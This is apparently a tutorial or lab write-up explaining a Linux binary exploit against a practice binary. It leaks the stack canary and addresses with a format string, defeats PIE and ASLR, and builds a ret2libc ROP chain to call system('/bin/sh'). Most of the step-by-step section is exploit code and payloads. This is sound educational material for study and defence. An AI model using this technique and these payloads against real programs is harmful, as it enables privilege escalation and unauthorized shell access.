# Privilege Escalation via Format String and ret2libc Attack

This project demonstrates a Linux binary exploitation technique that leverages:

- A **format string vulnerability** to leak memory addresses  
- **Bypassing ASLR and stack canary protections**  
- A **ret2libc attack** to gain shell access  

---

## 🧠 Overview

The target binary includes common security mechanisms:

- **ASLR** (Address Space Layout Randomization)  
- **Stack Canary** (to prevent stack smashing)  
- **PIE** (Position Independent Executable)  

The goal is to **leak protected information** and exploit it to **gain a shell** by executing `system("/bin/sh")`.

---

## 📌 Exploitation Strategy

1. **Leak the stack canary and main address** using a format string vulnerability  
2. **Compute the binary base address** (defeat PIE) and find necessary function/gadget addresses  
3. **Leak a libc address** using `puts()` to calculate the libc base address  
4. **Launch a ret2libc attack** to call `system("/bin/sh")`  

---

## 🔍 Step-by-Step Exploit

### 1. Leak Stack Canary & Binary Base Address

The format string vulnerability allows leaking memory values:


io.sendline(b'%17$p.%13$p')
leak_line = io.recvline().strip()
main_str, canary_str = leak_line.split(b'.')
main = int(main_str, 16)
canary = int(canary_str, 16)


### 2. Calculate Important Addresses

Using known offsets:

binary_base = main - main_offset
getchar = getchar_got_offset + binary_base
puts = puts_plt_offset + binary_base
pop_rdi = pop_rdi_offset + binary_base
ret = ret_offset + binary_base

This gives us:

    GOT address of getchar

    PLT address of puts

    pop rdi; ret gadget

    ret gadget for alignment

### 3. Leak a libc Address

We leak getchar's actual libc address via puts():

payload = b'Y' * 104
payload += p64(canary)
payload += b'Y' * 8
payload += p64(pop_rdi)
payload += p64(getchar)
payload += p64(puts)
payload += p64(main)

Parse the leaked address:

getchar_libc = u64(io.recvline().strip().ljust(8, b"\x00"))
libc_base = getchar_libc - getchar_libc_offset

### 4. ret2libc: Execute system("/bin/sh")

Once the libc base is known:

system_address = libc_base + system_offset
bin_sh_address = libc_base + bin_sh_offset

Final payload:

payload = b'Y' * 104
payload += p64(canary)
payload += b'A' * 8
payload += p64(pop_rdi)
payload += p64(bin_sh_address)
payload += p64(ret)
payload += p64(system_address)
